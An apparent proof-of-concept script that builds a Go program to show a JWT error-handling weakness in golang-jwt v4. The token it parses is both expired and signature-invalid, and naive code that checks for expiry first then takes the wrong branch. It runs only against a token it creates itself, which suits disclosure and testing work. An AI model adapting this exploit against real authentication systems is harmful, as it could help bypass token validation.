#
# The script crafts a JWT that is simultaneously expired and signature-invalid
# and parses it with the vulnerable ParseWithClaims implementation.  Because
# the returned error contains both ErrTokenExpired and ErrTokenSignatureInvalid
# flags, naïve code that checks for “expired” first will enter that branch,
# demonstrating the vulnerability.

import sys, textwrap, subprocess, os, tempfile

def main():
    if len(sys.argv) < 2:
        print("Usage: python exploit.py <secret>")
        sys.exit(1)

    secret = sys.argv[1]

    go_code = textwrap.dedent('''
        package main

        import (
            "errors"
            "fmt"
            "os"
            "time"

            "github.com/golang-jwt/jwt/v4"
        )

        func main() {
            secret := os.Args[1]

            // 1) create an already-expired token
            claims := jwt.RegisteredClaims{
                ExpiresAt: jwt.NewNumericDate(time.Unix(0, 0)), // long expired
            }
            t := jwt.NewWithClaims(jwt.SigningMethodHS256, claims)
            tokenString, _ := t.SignedString([]byte(secret))

            // 2) corrupt its signature so verification will fail
            if len(tokenString) > 0 {
                tokenString = tokenString[:len(tokenString)-1] + "X"
            }

            // 3) parse with vulnerable library
            keyFunc := func(token *jwt.Token) (interface{}, error) {
                return []byte(secret), nil
            }
            token, err := jwt.ParseWithClaims(tokenString, &jwt.RegisteredClaims{}, keyFunc)

            fmt.Println("Returned token.Valid =", token.Valid)
            fmt.Println("errors.Is(err, ErrTokenExpired) =", errors.Is(err, jwt.ErrTokenExpired))
            fmt.Println("errors.Is(err, ErrTokenSignatureInvalid) =", errors.Is(err, jwt.ErrTokenSignatureInvalid))

            // naïve application logic (vulnerable)
            if token.Valid {
                fmt.Println("ACCEPT")
            } else if errors.Is(err, jwt.ErrTokenExpired) {
                fmt.Println("EXPIRED branch reached -> vulnerability triggered!")
            } else {
                fmt.Println("REJECT")
            }
        }
    ''')

    with tempfile.TemporaryDirectory() as d:
        go_file = os.path.join(d, "exploit_main.go")
        with open(go_file, "w") as f:
            f.write(go_code)
        subprocess.run(["go", "run", go_file, secret], check=True)

